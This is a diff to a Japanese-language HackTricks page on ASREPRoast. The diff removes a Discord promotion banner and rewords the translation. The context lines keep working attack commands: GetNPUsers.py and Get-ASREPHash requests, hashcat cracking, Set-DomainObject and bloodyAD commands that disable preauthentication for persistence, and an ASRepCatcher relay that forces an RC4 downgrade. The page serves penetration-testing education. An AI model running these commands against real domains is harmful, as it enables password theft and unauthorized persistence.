@@ -2,30 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
-
-経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために、[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加してください！
-
-**ハッキングの洞察**\
-ハッキングのスリルと課題に深く掘り下げたコンテンツに参加しましょう
-
-**リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、急速に変化するハッキングの世界を把握しましょう
-
-**最新のお知らせ**\
-新しいバグバウンティの開始や重要なプラットフォームの更新について情報を得てください
-
-今日、[**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、トップハッカーとコラボレーションを始めましょう！
-
 ## ASREPRoast
 
-ASREPRoastは、**Kerberosプレ認証必須属性**が欠如しているユーザーを悪用するセキュリティ攻撃です。本質的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずにドメインコントローラー（DC）からユーザーの認証を要求できます。DCは、ユーザーのパスワード派生キーで暗号化されたメッセージで応答し、攻撃者はオフラインでそれを解読してユーザーのパスワードを発見しようとします。
+ASREPRoastは、**Kerberos事前認証必須属性**が欠如しているユーザーを悪用するセキュリティ攻撃です。本質的に、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずにドメインコントローラー（DC）からユーザーの認証を要求できます。DCは、その後、ユーザーのパスワード派生キーで暗号化されたメッセージで応答し、攻撃者はオフラインでクラックを試みてユーザーのパスワードを発見することができます。
 
 この攻撃の主な要件は次のとおりです：
 
-- **Kerberosプレ認証の欠如**：ターゲットユーザーはこのセキュリティ機能が有効でない必要があります。
-- **ドメインコントローラー（DC）への接続**：攻撃者はリクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
-- **オプションのドメインアカウント**：ドメインアカウントを持つことで、攻撃者はLDAPクエリを通じて脆弱なユーザーをより効率的に特定できます。そのようなアカウントがない場合、攻撃者はユーザー名を推測しなければなりません。
+- **Kerberos事前認証の欠如**：ターゲットユーザーは、このセキュリティ機能が有効になっていない必要があります。
+- **ドメインコントローラー（DC）への接続**：攻撃者は、リクエストを送信し、暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
+- **オプションのドメインアカウント**：ドメインアカウントを持つことで、攻撃者はLDAPクエリを通じて脆弱なユーザーをより効率的に特定できます。そのようなアカウントがない場合、攻撃者はユーザー名を推測する必要があります。
 
 #### 脆弱なユーザーの列挙（ドメイン資格情報が必要）
 ```bash:Using Windows
@@ -48,7 +33,7 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> Rubeusを使用したAS-REP Roastingは、暗号化タイプ0x17および事前認証タイプ0の4768を生成します。
+> AS-REP Roasting with Rubeus は、暗号化タイプ 0x17 および事前認証タイプ 0 の 4768 を生成します。
 
 ### クラッキング
 ```bash
@@ -57,7 +42,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistence
 
-**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して **preauth** を強制する必要はありません：
+**GenericAll** 権限（またはプロパティを書き込む権限）があるユーザーに対して **preauth** を強制する必要はありません：
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -68,7 +53,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ## ASREProast without credentials
 
 攻撃者は、Kerberosの事前認証が無効になっていることに依存せず、ネットワークを横断するAS-REPパケットをキャプチャするために中間者の位置を利用できます。したがって、VLAN上のすべてのユーザーに対して機能します。\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) は、これを可能にします。さらに、このツールはKerberosの交渉を変更することによって、クライアントワークステーションにRC4を使用させることを強制します。
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) はそのためのツールです。さらに、このツールはKerberosの交渉を変更することによってクライアントワークステーションにRC4を使用させることを強制します。
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -84,20 +69,5 @@ ASRepCatcher listen
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
 ---
-
-<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
-
-経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加しましょう！
-
-**ハッキングの洞察**\
-ハッキングのスリルと課題に深く掘り下げたコンテンツに参加してください
-
-**リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、急速に変化するハッキングの世界を把握しましょう
-
-**最新のお知らせ**\
-新しいバグバウンティの開始や重要なプラットフォームの更新について最新情報を得てください
-
-**私たちに参加してください** [**Discord**](https://discord.com/invite/N3FrSbmwdy) で、今日からトップハッカーとコラボレーションを始めましょう！
 
 {{#include ../../banners/hacktricks-training.md}}
